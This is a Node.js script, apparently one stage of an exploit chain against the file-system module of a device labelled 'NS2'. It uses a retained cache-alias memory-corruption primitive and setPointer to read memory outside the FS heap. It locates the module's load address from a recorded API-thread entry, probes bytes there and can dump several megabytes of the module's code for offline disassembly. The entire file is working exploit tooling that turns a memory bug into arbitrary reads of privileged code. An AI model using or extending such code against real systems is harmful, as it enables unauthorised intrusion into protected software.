// Read-only probe: can the retained two-cache alias reach the FS module image?
//
// The API-thread entry in *-api-workers.json is real FS code, so it proves the
// module's load address without a dump. Reading a few bytes there tells us
// whether setPointer can retarget the alias outside the FS heap. If it can, the
// dump gives us the waiter/dispatch path offline (capstone is installed for
// Python). Nothing here parks a session or wakes an FS thread.
//
// Env:
//   NS2_FS_PROBE_START   first address to read (default: the API-thread entry)
//   NS2_FS_PROBE_BYTES   bytes for the first read (16..0x1000, default 0x40)
//   NS2_FS_DUMP_BYTES    if set, also dump this many bytes (default start: the
//                        2 MiB-aligned module base)
//   NS2_FS_DUMP_START    dump start address (default: the module base)
const fs = require('node:fs/promises');
const path = require('node:path');
const crypto = require('node:crypto');
const {connect} = require('../tools/fs-memory.cjs');
const check = (ok, message) => { if (!ok) throw Error(message); };
const hash = bytes => crypto.createHash('sha256').update(bytes).digest('hex');
const alignment = 0x200000;

async function main() {
  const memory = await connect();
  const workers = JSON.parse(await fs.readFile(path.join(__dirname, memory.info.session + '-api-workers.json')));
  check(workers.session === memory.info.session && workers.workers?.length === 7, 'Stale API-worker proof');
  const entry = workers.workers[0].entry;
  const base = Number(BigInt(entry) & ~BigInt(alignment - 1));
  const at = Number(process.env.NS2_FS_PROBE_START || entry);
  const probe = Math.max(16, Math.min(0x1000, Number(process.env.NS2_FS_PROBE_BYTES) || 0x40));
  console.log(JSON.stringify({step: 'probe', at, length: probe, entry, base}));
  const bytes = await memory.read(at, probe);
  const probeFile = path.join(__dirname, memory.info.session + '-fs-probe-' + Date.now() + '.bin');
  await fs.writeFile(probeFile, bytes, {mode: 0o600});
  console.log(JSON.stringify({step: 'probe-read', at, length: bytes.length, sha256: hash(bytes),
    hex: bytes.subarray(0, 64).toString('hex'), probeFile}));

  const size = Number(process.env.NS2_FS_DUMP_BYTES || 0);
  const proof = {session: memory.info.session, entry, base, at, length: bytes.length,
    sha256: hash(bytes), probeFile, dumpFile: null, dumpStart: null, dumpSize: null};
  if (size > 0) {
    check(size <= 0x600000 * 8, 'Dump size is too large');
    const start = Number(process.env.NS2_FS_DUMP_START || base);
    console.log(JSON.stringify({step: 'dump', start, length: size, chunks: Math.ceil(size / 0x4000)}));
    // memory.read pages through setPointer in 0x4000 steps; a failure names the
    // first chunk that could not be retargeted.
    const image = await memory.read(start, size);
    const dumpFile = path.join(__dirname, memory.info.session + '-fs-text-' + Date.now() + '.bin');
    await fs.writeFile(dumpFile, image, {mode: 0o600});
    Object.assign(proof, {dumpFile, dumpStart: start, dumpSize: image.length, dumpSha256: hash(image)});
    console.log(JSON.stringify({step: 'dump-done', start, length: image.length, sha256: hash(image), dumpFile}));
  }
  const file = path.join(__dirname, memory.info.session + '-fs-probe-' + Date.now() + '.json');
  await fs.writeFile(file, JSON.stringify(proof, null, 2) + '\n', {mode: 0o600});
  return {...proof, file};
}

if (require.main === module) {
  main().then(result => console.log(JSON.stringify(result)))
    .catch(error => { console.error(error.stack); process.exitCode = 1; });
}

module.exports = {main};
